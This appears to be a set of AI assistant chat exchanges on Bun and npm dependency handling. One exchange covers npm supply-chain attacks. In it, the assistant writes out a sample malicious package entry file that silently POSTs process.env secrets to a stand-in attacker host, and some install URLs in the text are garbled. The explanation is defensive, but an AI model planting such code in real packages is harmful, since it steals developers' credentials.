- **The "Everything as Peer" Way:** The developer calls `getWeather()`. It crashes because they don't have `axios` installed in their main app. You have leaked your hidden implementation details into their project configuration.

***

### The Balanced Approach (What to actually do)

To save your team from endless configuration headaches, categorize your dependencies using this strict split:

1. **Keep Frameworks and Singletons as `peerDependencies`:**\
   Keep `react` and `react-dom` here. This is non-negotiable because sharing their runtime memory instance is mandatory.
2. **Move Pure Utilities to Normal `dependencies`:**\
   Put `axios`, `lodash`, or `date-fns` here. Because you are using **Bun**, Bun will automatically deduplicate and hard-link these packages on the hard drive anyway if the main app happens to use them too.

By keeping utilities in normal dependencies, your developers get a true "plug-and-play" experience: they run `bun add username/shared-repo`, and it works instantly without forcing them to manage a laundry list of secondary packages.

Would you like to review the **current `package.json`** of your shared library so we can sort its packages into the perfect mix of standard dependencies and peer dependencies?

## will they install the peer deps if the main app doesnt declare

will they install the peer deps if the main app doesnt declare

8:29 PM

<mark><strong><span>Yes, Bun will automatically install peer dependencies by default</span></strong>, even if the main host application does not declare them in its own</mark> `package.json`. Modern versions of npm (v7+) and pnpm follow this exact same behavior. [link](https://bun.com/docs/pm/cli/install)

However, _how_ it handles it introduces a tricky architectural choice for your project.

### The Breakdown of What Happens

If a developer clones a brand new main application that only imports your hook library (`my-custom-hooks`) and has a completely blank `dependencies` block, running `bun install` triggers the following lifecycle:

1. **Bun reads the graph:** Bun downloads your Git package, notices it asks for `react` as a peer dependency, and checks if the main application already provided a copy. [link](https://javascript.plainenglish.io/understanding-peer-dependencies-a-key-concept-in-coding-aa8507cc74ea)
2. **Auto-Install triggers:** Since the main app didn't declare React, Bun steps in and **automatically downloads the latest matching version of React** and drops it into the main `node_modules` folder for you. [link](https://bun.com/blog/bun-v1.0.5)
3. **The Result:** The application will run, and the hook library will find React safely.

***

### The Architecture Problem: Who controls the version?

While this auto-install behavior keeps the app from crashing out of the gate, it breaks the core philosophy of what a peer dependency is supposed to do.

By failing to declare React in the main application's `package.json`, you give up control over your tech stack:

- **Blind Version Bumps:** If your shared hook library specifies `"react": "^18.0.0 || ^19.0.0"`, Bun will look at npm and install the highest possible version it can find (e.g., React 19). If your main application was structurally written for older React 18 paradigms, your app code might break because Bun pulled an entirely different version behind the scenes.
- **Invisible Upgrades:** If you update your custom hooks repository next month to require a new version of React, a developer running `bun install` on the main app will silently have their local React version upgraded without a single line of code changing in the main application's `package.json`.

***

### The Verdict: How to write it cleanly

You should **never** rely on the package manager's auto-installer to guess the host framework version.

To keep your architecture solid, enforce this setup across your team:

1. **Keep it as a Peer Dep in the Hook Repo:**\
   json

<!---->

```
// my-custom-hooks/package.json
"peerDependencies": {
  "react": "^18.0.0 || ^19.0.0"
}
```

Use code with caution.
2\. **Explicitly Declare it in the Main App:**\
json

```
// my-main-app/package.json
"dependencies": {
  "my-custom-hooks": "github:username/repo",
  "react": "^19.0.0"  // <-- Explicitly define this here!
}
```

Use code with caution.

By explicitly pinning it in the main application, you guarantee that Bun will lock down that specific version of React across the entire environment, eliminating any random layout or compilation surprises during production builds.

Would you like a template for a **clean boilerplate configuration** (including the `package.json` configurations and basic folder layouts) to hand off to your team for this project?

- [link](https://bun.com/docs/pm/cli/install)\
  Bun\
  bun install | Bun Docs\
  Bun installs peerDependencies by default. Bun handles peer dependencies like Yarn: bun install installs them automatically.
- [link](https://bun.com/blog/bun-v1.0.5)\
  Bun\
  Bun v1.0.5 | Bun Blog\
  bun install now automatically installs unmet peer dependencies by default. This means that if you install a package that has peer ...
- [link](https://medium.com/@afnank/the-mystical-world-of-npm-dependencies-peer-dependencies-why-npm-i-force-is-not-the-best-idea-0ae24eb03053)\
  Medium\
  The Mystical World of npm Dependencies, Peer ... - Medium\
  ... it was like an old manager who didn't care — they let the frosting bring its own butter jar. Sometimes it worked, sometimes th...

Show all

## can i have node modules package json in the deps folder, and another packagejson in sub folder of the deps folder

can i have node modules package json in the deps folder, and another packagejson in sub folder of the deps folder

8:35 PM

<mark><strong><span>Yes, absolutely.</span></strong></mark> You can put a `package.json` at the root of your shared dependencies folder, and additional `package.json` files inside any of its subfolders. [link](https://travis-jones.medium.com/packages-sub-packages-and-npm-414aff5096fe)

In fact, this is an old-school, highly effective trick in the JavaScript world used to enable clean extensionless subpath imports (like `import { x } from 'my-utils/folder'`). [link](https://github.com/microsoft/TypeScript/issues/50794)

***

### How It Works Structurally

When you map your dependency via Bun/npm Git to your main application, your application will download the shared repository structure into `node_modules` exactly like this:

text

```
node_modules/
└── my-shared-utils/
    ├── package.json          <── Root package.json (Defines package name)
    ├── index.ts
    └── subfolder/
        ├── package.json      <── Nested package.json (Defines subpath rules)
        └── file.ts
```

Use code with caution.

### 1. The Root `package.json`

This file declares the main package name that developers use to invoke the library:

json

```
{
  "name": "my-shared-utils",
  "version": "1.0.0",
  "private": true,
  "main": "index.ts"
}
```

Use code with caution.

### 2. The Nested `package.json` (Inside `/subfolder/`)

This file redirects Node, Bun, and TypeScript. When a user tries to import from `my-shared-utils/subfolder`, the runtime hits the folder, reads the nested `package.json`, and looks for its `"main"` or `"types"` properties: [link](https://medium.com/@haricane8133/nodes-module-resolution-and-the-perils-of-multiple-node-modules-with-webpack-61b507e5602e)

json

```
{
  "main": "file.ts",
  "types": "file.ts"
}
```

Use code with caution.

_(Notice you do **not** declare a `"name"` property here. It inherits the parent folder's identity)._ [link](https://travis-jones.medium.com/packages-sub-packages-and-npm-414aff5096fe)

***

### Why People Do This

Before modern bundlers introduced the `"exports"` configuration field, dropping a tiny `package.json` inside a subfolder was the **only** way to allow developers to import deep paths without extensions or leaking full filenames: [link](https://nodejs.org/api/packages.html)

javascript

```
// Thanks to the nested package.json, this resolves straight to /subfolder/file.ts
import { myFunc } from 'my-shared-utils/subfolder';
```

Use code with caution.

### One Important Behavior to Keep in Mind

In the JavaScript module resolution algorithm, **a `package.json` defines a scope boundary**. [link](https://beta.docs.nodejs.org/packages)

If you put a property like `"type": "module"` or `"type": "commonjs"` in your root `package.json`, it applies to all subfolders **until** Node encounters another `package.json`. If your subfolder has its own `package.json`, it resets those assumptions, meaning you must specify `"type": "module"` or specify its compilers in the sub-file as well if it behaves differently than the root. [link](https://beta.docs.nodejs.org/packages)

Are you setting this up specifically to achieve **cleaner import names** for your developers, or are you hoping to manage different **third-party dependencies** specifically inside that subfolder?

- [link](https://travis-jones.medium.com/packages-sub-packages-and-npm-414aff5096fe)\
  Medium\
  Packages, Sub-packages, and NPM - Travis Jones - Medium\
  In this package, we have a package.json file in the top directory, then additional package.json files in sub-directories. we would...
- [link](https://github.com/yarnpkg/yarn/issues/711)\
  GitHub\
  Allow child packages to install into a single node\_modules in ...\
  ... we have a modules directory which in turn has a new subdirectory for each package. As such, it could be visualised like this: ...
- [link](https://github.com/microsoft/TypeScript/issues/50794)\
  GitHub\
  Support package.json exports outside of Node #50794\
  When any module resolver that supports exports. If you must have a dist folder, The first way is to use directories with package. ...

Show all

## i mean to separate deps of deps and deps of some specific deps, will bun install them normally

i mean to separate deps of deps and deps of some specific deps, will bun install them normally

8:36 PM

<mark><strong><span>No, Bun (and npm/pnpm) will not install them normally.</span></strong></mark>

If you publish or push a Git repository that contains a nested `package.json` inside a subfolder, and that subfolder's `package.json` declares its own private `"dependencies"`, package managers **completely ignore the subfolder's dependencies** when someone runs `bun install` or `bun add` from a main application. [link](https://travis-jones.medium.com/packages-sub-packages-and-npm-414aff5096fe)

***

### Why Bun Will Skip the Subfolder Dependencies

When you run `bun add username/my-shared-utils`, Bun behaves as follows:

1. It reads _only_ the **root** `package.json` of that repository.
2. It looks at the `"dependencies"` array in that root file and installs them.
3. It downloads the whole folder structure (including your subfolder and its nested `package.json`) and drops it into `node_modules/my-shared-utils/`. [link](https://bun.com/docs/pm/overrides)

Bun **does not scan deep inside subdirectories** looking for secondary `package.json` files to pull more third-party dependencies from npm. If a developer runs the main application and invokes the subfolder code, it will crash with a `Cannot find module` runtime error because the subfolder's private dependencies were never downloaded.

***

### How to Achieve the Exact Scope Separation You Want

If you want to ensure that specific sub-utilities bring their own isolated dependencies without cluttering the global scope, you have two elegant architectural choices that Bun fully supports:

#### Option 1: Consolidate to the Root `package.json` (The Easiest Way)

You can absolutely keep your nested `package.json` inside the subfolder strictly for **routing purposes** (dropping suffixes/extensions). However, you must move all the third-party dependencies into the repository's **root** `package.json`: [link](https://glebbahmutov.com/blog/subfolders-as-dependencies/)

json

```
// my-shared-utils/package.json (ROOT)
{
  "name": "my-shared-utils",
  "dependencies": {
    "axios": "^1.0.0",       // Used by the root project
    "date-fns": "^3.0.0"     // Used ONLY by the subfolder code
  }
}
```

Use code with caution.

- **Why this is perfectly fine in Bun:** Because Bun aggressively deduplicates packages, keeping them in the root file changes nothing about the final performance. The subfolder code will still be able to import `date-fns` instantly by looking upward through `node_modules`. [link](https://bun.com/docs/pm/workspaces)

#### Option 2: Transition into Native Bun Workspaces (The Monorepo Approach)

If you strictly want the subfolder to act as an entirely separate package with its own private boundary and independent `dependencies`, you must turn your shared Git repository into a **Monorepo Workspace**. [link](https://bun.com/guides/install/workspaces)

1. In the **root** of your shared Git repository, add a `workspaces` field:\
   json

<!---->

```
// my-shared-utils/package.json
{
  "name": "my-shared-utils-root",
  "private": true,
  "workspaces": ["packages/*"]
}
```

Use code with caution.
2\. Move your subfolder inside a `/packages/` directory (e.g., `packages/date-helper/package.json`). Give it a standalone name:\
json

```
{
  "name": "@my-utils/date-helper",
  "dependencies": {
    "date-fns": "^3.0.0"
  }
}
```

Use code with caution.
3\. In your main application, you can now add the individual workspace packages directly over Git, or use a tool like **[Changesets](https://github.com/changesets/changesets)** to publish them to a private registry as completely independent items.

To choose the simplest path forward, let me know:

- How many **specific subfolders** have their own unique dependencies?

- Is it acceptable to **move those dependency names up to the root** `package.json` of the shared repo, or do they absolutely need to remain separated due to team ownership or build sizes?

- [link](https://travis-jones.medium.com/packages-sub-packages-and-npm-414aff5096fe)\
  Medium\
  Packages, Sub-packages, and NPM - Travis Jones\
  In this package, we have a package. json file in the top directory, then additional package. json files in sub-directories. With t...

- [link](https://bun.com/docs/pm/workspaces)\
  Bun\
  Workspaces | Bun Docs\
  Bun can de-duplicate dependencies. If a and b share a common dependency, Bun hoists it to the root node\_modules directory. This sa...

- [link](https://bun.com/docs/pm/cli/install)\
  Bun\
  bun install | Bun Docs\
  Peer dependencies?#. Bun handles peer dependencies like Yarn: bun install installs them automatically. If the dependency is marked...

Show all

## does bun avoid network fetch when i add the same version of the same git url

**Yes, Bun completely avoids a network fetch** if you run `bun install` or `bun add` on a Git URL that matches a version/commit hash already saved in its global cache. [link](https://bun.com/docs/pm/global-cache)

However, because Git URLs can reference moving targets (like a branch name), how Bun behaves depends entirely on **how you format the Git URL** in your configuration.

***

### Scenario A: You Target a Fixed Commit or Tag 🟢 (Zero Network Fetch)

If your `package.json` maps your dependency using an absolute immutable point, such as a **Commit SHA** or a strict **Git Tag**: [link](https://github.com/oven-sh/bun/issues/11548)

json

```
"dependencies": {
  "super-utils": "github:username/repo#a1b2c3d"
}
```

Use code with caution.

- **Bun's Reaction:** When you run `bun install`, Bun hashes that exact string. It looks inside its global directory (`~/.bun/install/cache`). If it finds a match, it **instantly stops**. It will not ping GitHub, it will not fetch updates, and it uses a local copy to link it straight into your project. [link](https://bun.com/docs/pm/cli/install)

### Scenario B: You Target a Moving Branch 🟡 (Checks the Network)

If you target a branch that can receive new commits (like `#main` or `#dev`):

json

```
"dependencies": {
  "super-utils": "github:username/repo#main"
}
```

Use code with caution.

- **Bun's Reaction:** Bun cannot blindly assume your local cache matches the remote branch anymore. It has to make a quick network handshake with your Git host to retrieve the latest commit hash at the tip of that branch. [link](https://github.com/oven-sh/bun/issues/11548)
- **The Optimization:** If the remote commit SHA matches the commit SHA stored in your local cache, Bun immediately cuts off the download. It skips fetching the rest of the repository contents or files and maps your local cache instead. [link](https://bun.com/docs/pm/cli/install)

***

### How to Force Bun to Never Touch the Network

If you are writing scripts, working on airplanes, or managing a continuous integration (CI) pipeline where you want to explicitly forbid network requests for Git items, you can use Bun's built-in offline parameters: [link](https://bun.com/docs/pm/cli/install)

#### 1. Prefer Cache Over All Else

bash

```
bun install --prefer-offline
```

Use code with caution.

This forces Bun to use whatever local metadata and archives it has available for your Git packages without reaching out to confirm branch statuses or registry timelines. [link](https://bun.com/docs/pm/cli/install)

#### 2. Strictly Hard-Lock Offline Mode

bash

```
bun install --offline
```

Use code with caution.

This completely cuts off Bun's internal downloader. If your custom Git dependency—or any other package required by your project—isn't already cached locally on your machine, Bun will throw an intentional compilation error rather than touching the internet. [link](https://bun.com/docs/pm/cli/install)

Are you setting up your **production or CI workflows** (like GitHub Actions) to run entirely offline, or are you just optimizing local **development speed** for your team?

- [link](https://bun.com/docs/pm/cli/install)\
  Bun\
  bun install | Bun Docs\
  With a warm cache, bun install can run without the network: terminal. # Use cached package metadata regardless of age; only fetch ...
- [link](https://github.com/oven-sh/bun/issues/11548)\
  GitHub\
  bun requires clearing cache when updating package that is ...\
  bun add fails to resolve annotated Git tag over SSH but succeeds with the peeled commit SHA #28155 … when updating a cached git de...
- [link](https://bun.com/docs/pm/global-cache)\
  Bun\
  Global cache | Bun Docs\
  Bun stores packages downloaded from the registry in a global cache. The cache is located at: \* ~/.bun/install/cache. Bun can cache...

## when i omit the branch

When you omit the branch, tag, or commit hash entirely (e.g., you just use `github:username/repo` or `git+https://github.com`), <mark>Bun automatically treats it as a<span> </span><strong>moving branch target</strong></mark>. [link](https://bun.com/guides/install/add-git)

By default, Bun resolves the request to the repository's **default branch** (usually `main` or `master`). [link](https://github.com/oven-sh/bun/issues/13521)

### What happens under the hood during `bun install`?

1. **The Handshake:** Bun contacts your Git host (GitHub/GitLab) to check the tip of that default branch. It requests the **latest commit hash**. [link](https://vercel.com/docs/deployments/environments)
2. **The Cache Check:**

- **If the hash matches your local cache:** Bun skips the download entirely. It loads the package instantly from your machine's global cache (`~/.bun/install/cache`), giving you maximum speed.
- **If a new commit exists on the branch:** Bun downloads the latest version. Whenever possible, Bun pulls the branch as an HTTP tarball (a compressed snapshot) instead of running a heavy `git clone`, which keeps network overhead incredibly low. [link](https://bun.com/docs/pm/cli/install)

***

### The Big Warning: Lockfile Pinning ⚠️

When you run `bun add username/repo`, Bun generates a `bun.lock` file. Even though your `package.json` says `"username/repo"`, **Bun explicitly freezes the exact commit hash it found at that moment inside the lockfile**. [link](https://github.com/oven-sh/bun/issues/43350)

This means omitting the branch creates a specific behavioral pattern:

- **On your machine / CI:** Running a bare `bun install` will **never** pull new code if a lockfile is present. It strictly forces your project to stick to the commit hash pinned in your lockfile, ensuring your project remains stable and doesn't randomly break when someone updates the shared repo. [link](https://github.com/oven-sh/bun/issues/35420)

- **How to actually update it:** If you or a teammate push a change to the shared repository's default branch, the main application won't see it automatically. You must explicitly force Bun to refresh the link and look at the network again by running:\
  bash

<!---->

```
bun update my-shared-utils
```

Use code with caution.\
This overrides the lockfile, reaches out to the default branch on Git, pulls the latest commit, and re-pins the new hash into your lockfile. [link](https://github.com/oven-sh/bun/issues/18947)

Are you setting up a **CI/CD pipeline** (like GitHub Actions) and want to know how to properly cache this configuration so your build servers remain ultra-fast, or are you focused on optimizing your team's local terminal experience?

- [link](https://github.com/oven-sh/bun/issues/13521)\
  GitHub\
  Running bun create with a specific branch from GitHub #13521\
  Bun create only fetches the default branch for a github repository, which is fine for simple use-cases, but it would be nice to ha...
- [link](https://vercel.com/docs/deployments/environments)\
  Vercel\
  Environments - Vercel\
  Sep 17, 2026 — Always points to the latest changes on that branch; Commit-specific URL – Points to the exact deployment of that commit.
- [link](https://bun.com/docs/pm/cli/install)\
  Bun\
  bun install | Bun Docs\
  With a warm cache, bun install can run without the network: # Use cached package metadata regardless of age; only fetch what is mi...

Show all


# does npm install support git urls

## does npm install support git urls

7:48 PM

<mark><strong>Yes,<span> </span><code dir="ltr">npm install</code><span> </span>fully supports Git URLs.</strong></mark> You can install packages directly from hosted git repositories instead of relying on the npm registry. [link](https://stackoverflow.com/questions/61509905/does-npm-support-installing-dependencies-via-a-git-url-to-a-sub-folder-within-th)

When you use a Git URL, npm will clone the repository locally, check for a `package.json` file, and install it into your `node_modules` folder. [link](https://docs.npmjs.com/cli/v9/commands/npm-install/)

### Supported URL Protocols

You can target any public or private repository using the following URL structures: [link](https://docs.npmjs.com/cli/v9/commands/npm-install/)

- **HTTPS:** `npm install git+https://github.com`
- **SSH:** `npm install git+ssh://git@://github.com`
- **Git protocol:** `npm install git://://github.com`
- **Local File:** `npm install git+file://path/to/repo.git` [link](https://docs.npmjs.com/about-packages-and-modules/)

### Target Specific Branches, Commits, or Tags

By default, npm will clone the `HEAD` (usually `main` or `master`) branch. If you need a specific version, append a **commit-ish** marker (using `#`) to the end of the URL: [link](https://docs.npmjs.com/cli/v9/commands/npm-install/)

- **Branch:** `npm install git+https://github.com`
- **Commit Hash:** `npm install git+https://github.com`
- **Tag / SemVer Range:** `npm install git+https://github.com:^1.0.0` [link](https://docs.npmjs.com/cli/v8/commands/npm-install/)

### Shortcuts for Major Providers

If your repository is hosted on a popular service like GitHub, GitLab, or Bitbucket, npm offers concise shortcuts so you don't have to type the full URL: [link](https://github.com/npm/npm/issues/19788)

- **GitHub:** `npm install github:user/repo#branch` _(or simply `npm install user/repo#branch`)_
- **GitLab:** `npm install gitlab:user/repo#branch`
- **Bitbucket:** `npm install bitbucket:user/repo#branch` [link](https://stackoverflow.com/questions/16350673/depend-on-a-branch-or-tag-using-a-git-url-in-a-package-json)

### Important Caveats

- **Package.json Required:** The target Git repository must have a valid `package.json` file in its root directory, or npm will throw an error.
- **Build Steps:** If the source repository relies on a build step (like transpiling TypeScript into JavaScript), make sure the built files are either committed to the repo, or the repository includes a `prepare` or `prepack` script in its `package.json` to compile the code on the fly during installation. [link](https://github.com/npm/cli/issues/7313)

Are you trying to install from a **private repository** or dealing with a **monorepo / subdirectory**, or do you just need help formatting a specific dependency in your `package.json`?

- [link](https://stackoverflow.com/questions/61509905/does-npm-support-installing-dependencies-via-a-git-url-to-a-sub-folder-within-th)\
  Stack Overflow\
  Does NPM support installing dependencies via a Git URL to a sub-folder within the repo?\
  Yes, NPM supports installing dependencies via a Git URL to a sub-folder within the repo. You can create a new branch for each pack...
- [link](https://github.com/npm/npm/issues/19788)\
  GitHub\
  Support installing via git https URL from any domain name\
  Description Currently, npm does not support installation of modules from git services hosted on private domain names. That include...
- [link](https://docs.npmjs.com/cli/v8/commands/npm-install/)\
  npm Docs\
  npm-install | npm Docs\
  Other options include: \* \*\*global-style\*\* Installs packages into the local node\_modules folder with the same layout as the global ...

Show all

## can bad actors literally point to anywhere on the web wo governance

can bad actors literally point to anywhere on the web wo governance

7:49 PM

<mark><strong><span>Yes, functionally, a bad actor can point an npm dependency to almost anywhere on the web.</span></strong></mark> This exact lack of centralized governance is one of the biggest challenges in modern supply-chain security.

If an attacker compromises a popular open-source package or tricks a developer via a "typosquatting" attack (like creating `lodas-node` instead of `lodash`), they can modify the `package.json` or `package-lock.json` file to bypass the official npm registry entirely. They do this by using the exact Git and URL features mentioned previously. [link](https://www.youtube.com/watch?v=Wq6yMdt11LM)

Bad actors exploit this lack of global governance in several critical ways:

### 1. Lockfile Tampering (Silent Redirection)

An attacker doesn't even need to change your apparent version numbers. If they gain access to a repository, they can quietly open a Pull Request and alter the `package-lock.json` or `pnpm-lock.yaml` file. [link](https://www.youtube.com/watch?v=Wq6yMdt11LM)

- Inside a lockfile, there is a `resolved` field that tells npm exactly where to download the package.
- A bad actor can change `https://npmjs.org` to `https://malicious-server.com`.
- Unless developers carefully audit raw lockfile diffs during code reviews, npm will happily fetch and execute the code from that rogue server without any warning. [link](https://www.youtube.com/watch?v=Wq6yMdt11LM)

### 2. Bypassing the npm Registry's Malware Scanners

The official npm registry actively scans uploaded packages for known malware signatures and common vulnerabilities. By pointing directly to a rogue Git URL (`git+https://evil-site.com`), a bad actor completely circumvents the npm registry infrastructure. There is no central authority scanning that remote Git server to see if the code is safe.

### 3. The Danger: Install-Time Arbitrary Code Execution

Historically, simply running `npm install` on a compromised package allowed bad actors to execute malware on your machine immediately. [link](https://nhimg.org/articles/npm-v12-shifts-install-time-code-execution-to-opt-in/)

- They achieve this through npm **lifecycle scripts** (like `preinstall` or `postinstall`) embedded inside the malicious `package.json`. [link](https://tuxcare.com/blog/npm-security-best-practices/)
- Once `npm install` triggers, it can silently run background terminal scripts to steal your local `.env` files, read AWS/GitHub credentials, or install keyboard loggers. [link](https://supabase.com/docs/guides/security/npm-security)
- _Note:_ To combat this widespread abuse, modern ecosystem updates (like **npm v12** and **pnpm v10**) have shifted default behavior to make install scripts and arbitrary Git dependencies strictly **opt-in** via flags like `npm approve-scripts`. However, older versions remain fully vulnerable by default. [link](https://nhimg.org/articles/npm-v12-shifts-install-time-code-execution-to-opt-in/)

***

### How Teams Govern the Un-governed

Because the npm client allows developers to pull code from virtually any URL, security-conscious development teams enforce their own governance using specific configurations:

- **Lockfile Linting:** Teams use tools like `lockfile-lint` as a continuous integration (CI) check to validate that every single URL inside a project's lockfile exclusively originates from trusted hosts (like `https://registry.npmjs.org`). [link](https://www.youtube.com/watch?v=Wq6yMdt11LM)

- **Blocking "Exotic" Dependencies:** Modern package managers allow teams to set strict rules like `blockExoticSubdeps: true`, which explicitly instructs the compiler to reject any nested dependency attempting to resolve via a custom `github:`, `git+`, or `file:` URL. [link](https://github.com/lirantal/npm-security-best-practices)

- **Private Registries:** Enterprise teams completely disable public internet routing for npm by using internal proxy registries (like Nexus or Artifactory) that act as an absolute firewall, blocking unapproved external domains entirely.

- [link](https://www.youtube.com/watch?v=Wq6yMdt11LM)\
  YouTube·Better Stack\
  npm installs can hack your laptop (Here's how to stop it)\
  use \`lockfile-lint\` this tool validates your lock file by checking that every package resolves from a trusted host (like the npm r...\
  9:55

- [link](https://nhimg.org/articles/npm-v12-shifts-install-time-code-execution-to-opt-in/)\
  Non-Human Identity Management Group\
  npm v12 shifts install-time code execution to opt-in\
  GitHub's npm v12 will make install scripts, Git dependencies, and remote-URL packages opt-in, changing a decade of default behavio...

- [link](https://github.com/lirantal/npm-security-best-practices)\
  GitHub\
  Collection of npm package manager Security Best Practices\
  block packages newer than 30 days (43200 minutes) keep strict overrides only when necessary and vetted ・ blocks install scripts by...

Show all

## can they basically point to any self hosted git server of malicious code

can they basically point to any self hosted git server of malicious code

7:49 PM

<mark><strong><span>Yes, they absolutely can.</span></strong></mark> An attacker can point an npm dependency to any self-hosted Git server on the public internet, whether it is running on a private VPS, a rogue domain, or a compromised corporate server.

As long as the target machine running `npm install` can reach that server over the network, npm will treat that self-hosted instance exactly like it treats GitHub or the official registry.

### Why This Works (and Why It's Hard to Stop)

The underlying technology behind `npm install` relies on standard networking and terminal commands:

- **Under the Hood, It's Just Standard Git:** When you pass a URL like `git+https://malicious-server.xyz` to npm, the npm client simply spawns a background `git clone` process on your local computer.
- **No Domain Whitelisting:** The npm client does not maintain a "safe list" of approved domains. It treats `github.com` and `malicious-server.xyz` with the exact same level of trust.
- **Firewall Blind Spots:** Most developer machines and CI/CD servers require outbound HTTPS (port 443) access to download dependencies. Because self-hosted malicious Git servers also run over standard HTTPS, traditional network firewalls usually see this traffic as normal, benign web browsing and let it pass right through.

### The Attack Vector: Dynamic Malicious Code

Hosting the malicious code on a private, self-hosted server gives bad actors a massive advantage over publishing malware to public platforms:

- **Evasion of Security Researchers:** If an attacker hosts malware on GitHub, a security researcher will eventually flag it, and GitHub will take the repository down. If the attacker hosts it on their own private server, nobody can take it down or delete the repository except the attacker.
- **"JIT" (Just-In-Time) Malware Delivery:** Because the attacker controls the self-hosted Git server, they can program it to act dynamically. When a security researcher or automated scanner tries to download the code, the server can serve perfectly clean, innocent code. But when the server detects an installation coming from a targeted corporate IP address, it can dynamically switch the payload to serve active malware.

### How to Lockdown Your Setup

To prevent your projects or CI/CD pipelines from pulling code from untrusted, self-hosted Git servers, you can enforce the following guardrails:

- **Use `lockfile-lint`:** You can add this package to your project and configure it to fail your build if any URL in your lockfile doesn't match an approved pattern (e.g., forcing everything to come _only_ from `https://npmjs.org`).
- **Configure Package Manager Policies:** If you use newer package managers like **pnpm**, you can use the `allowedDeprecatedVersions` or custom validation settings to strictly forbid Git URLs entirely, forcing developers to only use explicit version numbers from an official registry.
- **Network Isolation:** Configure your CI/CD build servers so they are firewalled from the general internet. Block all outbound internet access _except_ to a specific, pre-approved list of domains (like your internal corporate registry or the official npm registry).

Are you trying to **secure a corporate CI/CD pipeline** against this type of supply-chain attack, or are you looking for **specific configuration snippets** (like `lockfile-lint` rules) to audit an existing project?

## can they easily run when you launch the project even if they have no postinstall

can they easily run when you launch the project even if they have no postinstall

7:50 PM

<mark><strong><span>Yes, absolutely.</span></strong></mark> Even if a malicious package completely avoids using `postinstall` or other lifecycle scripts, its code can still execute automatically **the moment your project launches** or as soon as a single file imports it.

In fact, avoiding `postinstall` scripts is a common tactic for sophisticated attackers because it helps them bypass automated security scanners that specifically flag packages containing install-time scripts.

Attackers execute code at launch using two primary methods:

### 1. Entry Point Execution (Upon `require` or `import`)

When a project launches, it reads its dependency tree. If your project (or one of your other trusted dependencies) imports the compromised package, Node.js executes the top-level code in that package's entry point file immediately.

An attacker simply places their malicious payload directly in the global scope of the main file (e.g., `index.js`):

javascript

```
// index.js (Inside the malicious package)
const crypto = require('crypto');
const http = require('http');

// This code runs AUTOMATICALLY the microsecond another file does
// require('malicious-package') or import 'malicious-package'
(async () => {
    try {
        // Exfiltrate environment variables containing secrets/keys
        const data = JSON.stringify(process.env);
        const req = http.request({
            hostname: 'attacker-controlled-server.com',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        req.write(data);
        req.end();
    } catch (e) {
        // Fail silently so the developer doesn't notice anything is wrong
    }
})();

// The package still exports its normal, expected functions
// so the application doesn't crash and everything looks legitimate.
module.exports = function standardUtility() {
    return "I look innocent!";
};
```

Use code with caution.

### 2. Prototype Pollution and Global Monkey-Patching

Attackers don't even need you to actively call their functions. Upon launch, the malicious package can modify Node.js built-in globals or standard library prototypes.

For example, they can monkey-patch the built-in `http` or `fs` modules. When your project later tries to read a file or connect to your database, it accidentally routes that data through the attacker's modified function first.

***

### How They Force the Project to Import Them

If a bad actor sneaks a package into your `dependencies`, they usually ensure it gets executed via one of two ways:

- **Typosquatting / Direct Dependency:** If they tricked you into installing `lodas-node` instead of `lodash`, you wrote `const _ = require('lodas-node')` in your code. When you run `npm start`, your entry point calls it immediately.
- **Deep Nested Dependencies:** If they compromised a minor plugin that a popular library relies on, you don't even know it's there. But when you launch your project and your main framework initializes, it loads its sub-dependencies, which load _their_ sub-dependencies, eventually triggering the attacker's code deep in the background.

### How to Prevent Runtime Execution

Since you cannot rely solely on blocking `postinstall` scripts, protecting your project at runtime requires defensive boundaries:

- **Production Environment Isolation:** Never run production applications or sensitive development environments with root/administrator privileges. If the Node.js process is restricted, a compromised package cannot access system files or install system-level malware.
- **Network Egress Filtering:** Restrict your application servers so they can only talk to known, whitelisted external APIs (like your database or payment gateway). If a malicious package tries to send stolen `.env` data to an unknown server, the network firewall will block the outbound request.
- **Dependency Auditing:** Run `npm audit` or use tools like Snyk or Socket.dev in your CI/CD pipeline. These tools analyze the source code of dependencies to flag packages that attempt unusual runtime behaviors, such as accessing the file system or making unexpected network requests.

Are you trying to set up **runtime monitoring** to catch unexpected network requests from your app, or would you like to see how to use **Content Security Policies (CSP)** or **network firewalls** to block untrusted external connections?

# how does bun run a symlinked file

## how does bun run a symlinked file

8:05 PM

By default, <mark><strong>Bun resolves symlinked files by their real, underlying disk path</strong><span> </span>rather than the path of the symbolic link itself</mark>. This matches the default behavior of Node.js. [link](https://github.com/oven-sh/bun/issues/4044)

When Bun executes or imports a symlinked file, it immediately evaluates the symlink to its **canonical realpath**. Consequently, any relative imports (`./` or `../`) inside that symlinked file will resolve relative to the _original file's location_ on disk, completely disregarding the folder structure of the consumer project that called it. [link](https://github.com/oven-sh/bun/issues/43689)

***

### Switching to Link-Relative Resolution

If your project relies on a module structure where a symlinked file needs to find dependencies inside the consumer's environment (e.g., in monorepos, code generators, or linked local packages), Bun provides flags to alter this behavior: [link](https://bun.com/docs/pm/cli/install)

#### 1. For the Entry Point / Main Script

If you are running a symlinked script directly via the CLI, use the `--preserve-symlinks-main` flag: [link](https://github.com/oven-sh/bun/issues/26695)

bash

```
bun --preserve-symlinks-main ./path-to-symlink.ts
```

Use code with caution.

This forces Bun to preserve the symlink context for the primary file being executed. [link](https://github.com/oven-sh/bun/issues/26695)

#### 2. For All Module Imports

If you want Bun's module resolver to keep the symlink path for _all_ files and dependencies it encounters while traversing your project, pass the general flag: [link](https://bun.com/docs/pm/cli/install)

bash

```
bun --preserve-symlinks ./index.js
```

Use code with caution.

_Note: In some scenarios like complex bundler pipelines (`bun build`), the runtime resolver fully supports this flag, while sub-features are continually being refined._ [link](https://github.com/oven-sh/bun/issues/31957)

Are you running into **dependency resolution issues (like "Module not found")** with a local package you are testing, or are you trying to configure a **monorepos setup**? Let me know so I can give you the exact command or `package.json` workflow you need.

- [link](https://github.com/oven-sh/bun/issues/10223)\
  GitHub\
  Symlink issue involving bun link #10223 - GitHub\
  add package to repository. bun link @wareme/translations --save \[0.02ms] ".env" bun link v1.1.3 (2615dc74) installed @wareme/trans...
- [link](https://bun.com/docs/pm/cli/install)\
  Bun\
  bun install | Bun Docs\
  Platform-specific backends For performance, bun install uses different system calls to install dependencies depending on the platf...
- [link](https://github.com/oven-sh/bun/issues/4044)\
  GitHub\
  Bun equivalent of Node's \`--preserve-symlinks\` · Issue #4044\
  Description \* What do you see instead? Mismatch between runtime value and what TS thinks at edit/compile time. \* Additional inform...

Show all

